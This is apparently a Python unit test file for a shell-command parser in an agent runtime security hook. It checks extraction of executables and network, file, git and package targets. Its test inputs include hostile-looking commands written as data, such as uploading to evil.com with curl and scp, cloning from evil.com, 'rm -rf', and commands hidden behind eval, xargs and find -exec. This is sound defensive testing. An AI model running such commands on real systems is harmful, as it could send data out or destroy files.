from __future__ import annotations

import importlib.util
import random
import sys
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parent.parent
ARS = ROOT / ".agent-runtime-security"
if str(ARS) not in sys.path:
    sys.path.insert(0, str(ARS))

spec = importlib.util.spec_from_file_location("agent_runtime_security_codex_hook_parser_tests", ARS / "codex_hook.py")
hook = importlib.util.module_from_spec(spec)
assert spec.loader is not None
sys.modules[spec.name] = hook
spec.loader.exec_module(hook)

from shell_parser import MAX_COMMAND_LENGTH, ShellParseError, parse_shell  # noqa: E402


class ShellParserTests(unittest.TestCase):
    def invocations(self, command: str) -> list[dict]:
        return [item.as_dict() for item in hook.extract_invocations(command)]

    def test_extracts_compound_subshell_and_combined_shell_c(self) -> None:
        invocations = self.invocations("printf safe && (bash -lc 'ping evil.com')")
        self.assertEqual(
            [item["executable"] for item in invocations],
            ["printf", "bash", "ping"],
        )
        self.assertEqual(invocations[-1]["argv"], ["ping", "evil.com"])

    def test_extracts_command_and_process_substitutions(self) -> None:
        for command in (
            "echo $(ping evil.com)",
            "echo `ping evil.com`",
            "cat <(ping evil.com)",
            "cat >(ping evil.com)",
        ):
            with self.subTest(command=command):
                invocations = self.invocations(command)
                self.assertIn("ping", [item["executable"] for item in invocations])

    def test_single_quotes_and_comments_do_not_create_phantom_commands(self) -> None:
        invocations = self.invocations("printf '%s' '$(ping evil.com)' # ping evil.com")
        self.assertEqual([item["executable"] for item in invocations], ["printf"])
        self.assertEqual(invocations[0]["argv"][-1], "$(ping evil.com)")

    def test_redirection_targets_are_not_process_arguments(self) -> None:
        invocation = self.invocations("ping example.com 2>&1 >/tmp/ping.log")[0]
        self.assertEqual(invocation["argv"], ["ping", "example.com"])
        self.assertEqual(invocation["targets"]["file.paths"], ["/tmp/ping.log"])

    def test_extracts_typed_semantic_targets(self) -> None:
        cases = {
            "curl https://evil.com/upload": {
                "network.destinations": ["evil.com"],
                "network.urls": ["https://evil.com/upload"],
            },
            "rm -rf /tmp/protected": {"file.paths": ["/tmp/protected"]},
            "git clone --depth 1 https://evil.com/repo.git checkout": {
                "git.operations": ["clone"],
                "git.repositories": ["https://evil.com/repo.git"],
                "network.destinations": ["evil.com"],
            },
            "npm install left-pad": {
                "package.operations": ["npm.install"],
                "package.names": ["left-pad"],
            },
            "scp local.txt user@evil.com:/tmp/remote": {
                "network.destinations": ["evil.com"],
                "file.paths": ["local.txt"],
            },
        }
        for command, expected in cases.items():
            with self.subTest(command=command):
                targets = self.invocations(command)[0]["targets"]
                for field_name, values in expected.items():
                    self.assertEqual(targets[field_name], values)

    def test_dynamic_semantic_target_is_marked_uncertain(self) -> None:
        invocation = self.invocations('curl "https://$HOST/upload"')[0]
        self.assertIn("network.destinations", invocation["uncertain_target_fields"])
        self.assertIn("network.urls", invocation["uncertain_target_fields"])

    def test_url_targets_strip_credentials_query_and_fragment(self) -> None:
        invocation = self.invocations(
            "curl 'https://user:password@evil.com/upload?token=secret#fragment'"
        )[0]
        self.assertEqual(invocation["targets"]["network.urls"], ["https://evil.com/upload"])

    def test_environment_wrappers_and_sudo_preserve_real_executable(self) -> None:
        cases = {
            "FOO=bar command -- /sbin/ping evil.com": "ping",
            "env -u FOO FOO=bar ping evil.com": "ping",
            "sudo -u root -- ping evil.com": "ping",
            "exec -a display-name /sbin/ping evil.com": "ping",
        }
        for command, expected in cases.items():
            with self.subTest(command=command):
                self.assertEqual(self.invocations(command)[0]["executable"], expected)

    def test_execution_prefixes_preserve_real_executable(self) -> None:
        cases = (
            "timeout --signal KILL 5 ping evil.com",
            "nice -n 10 ping evil.com",
            "setsid --fork ping evil.com",
            "stdbuf -oL ping evil.com",
            "chroot /tmp/root ping evil.com",
        )
        for command in cases:
            with self.subTest(command=command):
                invocation = self.invocations(command)[0]
                self.assertEqual(invocation["executable"], "ping")
                self.assertIn("evil.com", invocation["argv"])
                self.assertTrue(invocation["dispatch_chain"])

    def test_extracts_known_indirect_dispatchers(self) -> None:
        cases = (
            "printf x | xargs -n 1 ping evil.com",
            "find . -exec ping evil.com {} \\;",
            "find . -exec sh -c 'ping evil.com' {} \\;",
            "watch -n 1 'ping evil.com'",
            "watch --exec ping evil.com",
            "eval 'ping evil.com'",
        )
        for command in cases:
            with self.subTest(command=command):
                self.assertIn(
                    "ping", [item["executable"] for item in self.invocations(command)]
                )

        nested = self.invocations("printf x | xargs sh -c 'ping evil.com'")[-1]
        self.assertEqual(nested["executable"], "ping")
        self.assertEqual(nested["dispatch_chain"], ["xargs", "sh"])

    def test_runtime_supplied_dispatch_arguments_are_dynamic(self) -> None:
        xargs_ping = self.invocations("printf evil.com | xargs ping")[-1]
        find_ping = self.invocations("find . -exec ping {} \\;")[-1]
        self.assertEqual(xargs_ping["executable"], "ping")
        self.assertTrue(xargs_ping["dynamic_arguments"])
        self.assertEqual(find_ping["executable"], "ping")
        self.assertTrue(find_ping["dynamic_arguments"])

    def test_dynamic_argument_is_marked_but_unrelated_program_remains_parseable(self) -> None:
        invocation = self.invocations('printf "%s" "$HOME"')[0]
        self.assertEqual(invocation["executable"], "printf")
        self.assertTrue(invocation["dynamic_arguments"])

    def test_dynamic_executable_and_unsupported_constructs_fail_closed(self) -> None:
        for command in (
            "$PROGRAM evil.com",
            "if true; then ping evil.com; fi",
            "cat <<EOF",
            "parallel ping evil.com",
        ):
            with self.subTest(command=command), self.assertRaises(hook.PolicyError):
                hook.extract_invocations(command)

    def test_malformed_and_oversized_input_is_rejected(self) -> None:
        with self.assertRaises(ShellParseError):
            parse_shell("echo 'unterminated")
        with self.assertRaises(ShellParseError):
            parse_shell("x" * (MAX_COMMAND_LENGTH + 1))

    def test_deterministic_malformed_input_stress_never_raises_internal_errors(self) -> None:
        randomizer = random.Random(20260921)
        alphabet = "abcXYZ012 $'\"`\\;&|()<>{}[]#\n\t"
        for _ in range(500):
            command = "".join(randomizer.choice(alphabet) for _ in range(randomizer.randrange(128)))
            try:
                parse_shell(command)
            except ShellParseError:
                pass


if __name__ == "__main__":
    unittest.main()
